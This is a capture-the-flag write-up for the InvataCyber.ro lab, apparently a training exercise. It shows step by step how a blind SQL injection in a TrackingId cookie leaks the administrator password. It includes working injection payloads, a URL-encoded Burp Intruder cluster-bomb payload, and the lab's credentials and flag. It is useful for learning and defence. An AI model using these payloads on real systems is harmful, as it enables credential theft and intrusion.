# Write-up: InvataCyber.ro - Blind SQL Injection
*[Versiunea în limba română →](README.md)*
## Challenge Overview
The `InvataCyber.ro` application uses a `TrackingId` cookie to track user sessions. When the server recognizes a valid tracking ID, it returns the confirmation string: `>> [OK] Valid tracking signature detected.`

The application concatenates the `TrackingId` cookie directly into an internal SQL query without parameterization or sanitization. This introduces a boolean-based blind SQL injection vulnerability, allowing an attacker to extract database contents (including the `administrator` credentials) and authenticate through a hidden login route to retrieve the flag.

---

## Step 1: Intercepting and Proving the Vulnerability
1. Open Burp Suite and capture the `GET /` request.
2. Locate the tracking cookie in the request headers:
   ```http
   Cookie: TrackingId=base-tracking-id-123
   ```
3. Send the request to **Repeater** (`Ctrl+R` / `Cmd+R`).
4. Test boolean conditions by modifying the cookie value:
   - **True condition:** `TrackingId=base-tracking-id-123' AND '1'='1`  
     *Result:* Returns `>> [OK] Valid tracking signature detected.`
   - **False condition:** `TrackingId=base-tracking-id-123' AND '1'='2`  
     *Result:* Returns `>> [WARN] No valid tracking signature found.`

The distinct responses confirm that arbitrary SQL expressions can be evaluated through the cookie.

---

## Step 2: Reconnaissance & Formulating the Exploit

### Finding the Username
Standard table and column names (such as `users`, `username`, `password`) can be verified or queried from `sqlite_master`. To extract the first administrative username character-by-character:

```sql
' AND (SELECT SUBSTR(username, 1, 1) FROM users LIMIT 1) = 'a' --
```

Iterating through character positions extracts the target username: `administrator`.

### Determining Password Length
To find the password length without manual trial and error, test sequentially using the `LENGTH()` function:

```sql
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') < 1 --
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') < 2 --
```

Iterating this comparison in Burp Intruder shows the payload evaluates to true at `< 13` while failing at `< 12`. This establishes that the password length is exactly 12 characters.

### Extraction Query
Extract each character of the 12-character password using SQLite's `SUBSTR()` function:

```sql
' AND (SELECT SUBSTR(password, 1, 1) FROM users WHERE username='administrator') = 'a' --
```

---

## Step 3: Configuring Burp Intruder
1. Right-click the base request in Repeater and select **Send to Intruder** (`Ctrl+I` / `Cmd+I`).
2. Open the **Positions** tab.
3. Set the Attack Type to **Cluster Bomb** to iterate through positions and character sets simultaneously.
4. Clear default positions and place markers around the character index (`1`) and character value (`a`):
   ```text
   Cookie: TrackingId=base-tracking-id-123'%20AND%20(SELECT%20SUBSTR(password,%20§1§,%201)%20FROM%20users%20WHERE%20username='administrator')%20=%20'§a§'%20--
   ```

---

## Step 4: Configuring Payloads
Open the **Payloads** tab.

**Payload Set 1 (Index):**
- **Payload type:** Numbers
- **From:** 1
- **To:** 12
- **Step:** 1

**Payload Set 2 (Character):**
- **Payload type:** Simple list
- **Items:** `a-z` and `0-9` (lowercase alphanumeric set)

---

## Step 5: Configuring Grep-Match
1. Open the **Settings** tab in Intruder.
2. Under **Grep - Match**, clear default values.
3. Add the string: `[OK] Valid tracking signature`.

---

## Step 6: Running the Attack
1. Click **Start Attack**.
2. Sort results by the `[OK] Valid tracking signature` column to isolate matching responses.
3. Order matching entries by Payload 1 (indices 1 through 12) to assemble the full password: `a1b2c3d4e5f6`.

---

## Step 7: Flag Retrieval
1. Enumerate endpoints using a directory brute-force tool (`gobuster` or `dirb`) to identify the login route at `/login`.
2. Navigate to `/login` to access the **Administrator Override Console**.
3. Submit `administrator` as the username and `a1b2c3d4e5f6` as the password.
4. Click **Initialize Override**.
5. The application accepts the credentials and displays the flag: `InvataCyber{blind_sql}`.
